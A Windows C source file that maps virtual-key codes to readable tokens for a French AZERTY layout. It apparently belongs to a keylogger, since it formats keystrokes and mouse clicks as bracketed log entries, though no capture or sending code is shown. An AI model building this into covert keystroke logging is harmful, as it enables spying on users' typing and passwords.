#include <windows.h>
#include "key_management.h"

int specialKeys[SPECIAL_KEYS_LENGTH] = {
    0x08, // Backspace
    0x0D, // Enter
    0x20, // Space
    0xA4, 0xA5, // Left-Right Alt
    0x09, // Tab
    0xA0, 0xA1, // Left-Right Shift
    0xA2, 0xA3, // Left-Right Control
    0x1B, // Escape
    0x21, // Scroll Up
    0x22, // Scroll Down
    0x23, // End
    0x24, // Home
    0x25, // Left Arrow
    0x26, // Up Arrow
    0x27, // Right Arrow
    0x28, // Down Arrow
    0x2E, // Delete
    0x2D, // Insert
    0x01, 0x02, 0x04, // Left-Right-Middle Click
    0x05, 0x06, // X1-X2 Button
    0xBE, // Period
    0xBC, // Comma
    0xBA, 0xE2, 0xBF, 0xC0, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,// OEM_1-OEM_102-OEM_2-OEM_3-OEM_4-OEM_5-OEM_6-OEM_7-OEM_8
    0xBB, // OEM_Plus
    0xBD, // OEM_Minus
    0x6F, 0x6A, 0x6D, 0x6B, // Divide-Multiply-Subtract-Add
    0x30, // Touch "0"
    0x31, // Touch "1"
    0x32, // Touch "2"
    0x33, // Touch "3"
    0x34, // Touch "4"
    0x35, // Touch "5"
    0x36, // Touch "6"
    0x37, // Touch "7"
    0x38, // Touch "8"
    0x39, // Touch "9"
    0x60, // Numpad "0"
    0x61, // Numpad "1"
    0x62, // Numpad "2"
    0x63, // Numpad "3"
    0x64, // Numpad "4"
    0x65, // Numpad "5"
    0x66, // Numpad "6"
    0x67, // Numpad "7"
    0x68, // Numpad "8"
    0x69, // Numpad "9"
    0x6E, // Numpad "."
    0x90, // Num Lock
    0x2C, // Print Screen
};

// Check if the key is a special key
int CheckSpecialKey(int data) {
    int isSpecialKey = 0;

    for (int i = 0; i < SPECIAL_KEYS_LENGTH; i++) {
        if (data == specialKeys[i]) {
            isSpecialKey = 1;
            break;
        }
    }
    return isSpecialKey;
}

// Convert special key into readable key for Windows
char* SpecialKeyToReadable(int data) {
    char *specialKey = NULL;

    switch(data) {
        case 0x08: specialKey = "[BACKSPACE]";      break;
        case 0x0D: specialKey = "[ENTER]";          break;
        case 0x20: specialKey = " ";                break;
        case 0xA4: specialKey = "[LEFT ALT]";       break;
        case 0xA5: specialKey = "[RIGHT ALT]";      break;
        case 0x09: specialKey = "[TAB]";            break;
        case 0xA0: specialKey = "[LEFT SHIFT]";     break;
        case 0xA1: specialKey = "[RIGHT SHIFT]";    break;
        case 0xA2: specialKey = "[LEFT CONTROL]";   break;
        case 0xA3: specialKey = "[RIGHT CONTROL]";  break;
        case 0x1B: specialKey = "[ESCAPE]";         break;
        case 0x21: specialKey = "[SCROLL UP]";      break;
        case 0x22: specialKey = "[SCROLL DOWN]";    break;     
        case 0x23: specialKey = "[END LINE]";       break;
        case 0x24: specialKey = "[START LINE]";     break;
        case 0x25: specialKey = "[LEFT ARROW]";     break;
        case 0x26: specialKey = "[UP ARROW]";       break;
        case 0x27: specialKey = "[RIGHT ARROW]";    break; 
        case 0x28: specialKey = "[DOWN ARROW]";     break;
        case 0x2C: specialKey = "[PRINT SCREEN]";   break;
        case 0x2E: specialKey = "[DELETE]";         break;
        case 0x2D: specialKey = "[INSERT]";         break;
        case 0x01: specialKey = "[LEFT CLICK]";     break;
        case 0x02: specialKey = "[RIGHT CLICK]";    break;
        case 0x04: specialKey = "[MIDDLE CLICK]";   break;
        case 0x05: specialKey = "[X1 CLICK]";       break;
        case 0x06: specialKey = "[X2 CLICK]";       break;
        case 0xBA:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "£";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "¤";
            } else {
                specialKey = "$";
            }
            break;
        case 0xBB:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "+";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "}";
            } else {
                specialKey = "=";
            }
            break;
        case 0xBC:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "?";
            } else {
                specialKey = ",";
            }
            break;
        case 0xBE:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = ".";
            } else {
                specialKey = ";";
            }
            break;
        case 0xBF:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "/";
            } else {
                specialKey = ":";
            }
            break;
        case 0xC0:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "%";
            } else {
                specialKey = "ù";
            }
            break;
        case 0xDB:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "°";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "]";
            } else {
                specialKey = ")";
            }
            break;
        case 0xDC:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "µ";
            } else {
                specialKey = "*";
            }
            break;
        case 0xDD:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "¨";
            } else {
                specialKey = "^";
            }
            break;
        case 0xDE:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "µ";
            } else {
                specialKey = "*";
            }
            break;
        case 0xDF:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "§";
            } else {
                specialKey = "!";
            }
            break;
        case 0xE2:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0xA1) & 0x8000) {
                specialKey = ">";
            } else {
                specialKey = "<";
            }
            break;
        case 0x6F: specialKey = "/"; break;
        case 0x6A: specialKey = "*"; break;
        case 0x6D: specialKey = "-"; break;
        case 0x6B: specialKey = "+"; break;
        case 0x31:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "1";
            } else {
                specialKey = "&";
            }
            break;
        case 0x32:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "2";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "~";
            } else {
                specialKey = "é";
            }
            break;
        case 0x33:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "3";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "#";
            } else {
                specialKey = "\"";
            }
            break;
        case 0x34:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "4";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "{";
            } else {
                specialKey = "'";
            }
            break;
        case 0x35:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "5";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "[";
            } else {
                specialKey = "(";
            }
            break;
        case 0x36:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "6";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "|";
            } else {
                specialKey = "-";
            }
            break;
        case 0x37:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "7";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "`";
            } else {
                specialKey = "è";
            }
            break;
        case 0x38:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "8";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "\\";
            } else {
                specialKey = "_";
            }
            break;
        case 0x39:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "9";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "^";
            } else {
                specialKey = "ç";
            }
            break;
        case 0x30:
            if (GetKeyState(0xA0) & 0x8000 || GetKeyState(0x14) & 0x0001) {
                specialKey = "0";
            } else if (GetKeyState(0xA2) & GetKeyState(0xA5) & 0x8000) {
                specialKey = "@";
            } else {
                specialKey = "à";
            }
            break;
        case 0x60:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "0";
            } else {
                specialKey = "[INSERT MODE]";
            }
            break;
        case 0x61:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "1";
            } else {
                specialKey = "[END LINE]";
            }
            break;
        case 0x62:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "2";
            } else {
                specialKey = "[DOWN ARROW]";
            }
            break;
        case 0x63:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "3";
            } else {
                specialKey = "[SCROLL DOWN]";
            }
            break;
        case 0x64:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "4";
            } else {
                specialKey = "[LEFT ARROW]";
            }
            break;
        case 0x65:
            specialKey = "5";
            break;
        case 0x66:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "6";
            } else {
                specialKey = "[RIGHT ARROW]";
            }
            break;
        case 0x67:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "7";
            } else {
                specialKey = "[START LINE]";
            }
            break;
        case 0x68:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "8";
            } else {
                specialKey = "[UP ARROW]";
            }
            break;
        case 0x69:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "9";
            } else {
                specialKey = "[SCROLL UP]";
            }
            break;
        case 0x6E:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = ".";
            } else {
                specialKey = "[DELETE]";
            }
            break;
        case 0x90:
            if (GetKeyState(0x90) & 0x0001) {
                specialKey = "[NUMLOCK ON]";
            } else {
                specialKey = "[NUMLOCK OFF]";
            }
            break;
        default:
            break;
    }
    return specialKey;
}